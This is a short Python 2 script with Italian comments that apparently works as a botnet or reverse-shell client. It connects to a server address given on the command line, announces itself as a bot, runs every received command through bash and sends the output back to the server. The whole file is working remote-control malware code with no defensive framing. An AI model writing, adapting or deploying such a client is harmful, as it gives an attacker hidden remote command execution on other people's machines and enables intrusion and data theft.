# -*- coding: utf-8 -*-

import sys
from subprocess import Popen, PIPE
from socket import *

# Funzione principale - si aspetta l'indirizzo IP del server come argomento da riga di comando
def main():
    if len(sys.argv) != 2:
        # Se non viene passato l'indirizzo IP, mostra l'uso corretto e termina
        print "Uso: python script.py <server_ip>"
        sys.exit(1)

    serverName = sys.argv[1]  # IP del server a cui connettersi
    serverPort = 8000         # Porta del server su cui il client tenterà la connessione

    # Crea una socket TCP (IPv4)
    clientSocket = socket(AF_INET, SOCK_STREAM)
    
    try:
        # Tenta di connettersi al server specificato
        clientSocket.connect((serverName, serverPort))
        print "Connesso a %s:%d" % (serverName, serverPort)

        # Invia un messaggio iniziale al server per segnalare la connessione
        clientSocket.send("Bot reporting for duty")

        # Riceve il primo comando dal server
        command = clientSocket.recv(4064).decode('utf-8', 'ignore')

        # Continua a ricevere ed eseguire comandi finché non riceve "exit"
        while command != "exit":
            try:
                # Stampa a schermo il comando che sta per essere eseguito
                print "Eseguo: %s" % command
                
                # Esegue il comando utilizzando la shell Bash
                proc = Popen(["/bin/bash", "-c", command], stdout=PIPE, stderr=PIPE)
                result, err = proc.communicate()

                # Invia al server l'output standard del comando
                if result:
                    clientSocket.send(result)
                
                # Invia al server anche eventuali messaggi di errore (stderr)
                if err:
                    clientSocket.send(err)

            except Exception, e:
                # In caso di errore nell'esecuzione del comando, invia un messaggio di errore al server
                error_message = "Errore nell'esecuzione: %s" % str(e)
                clientSocket.send(error_message)

            # Riceve il comando successivo
            command = clientSocket.recv(4064).decode('utf-8', 'ignore')

    except Exception, e:
        # Gestione dell’eccezione generale, ad esempio fallimento della connessione
        print "Errore: %s" % str(e)
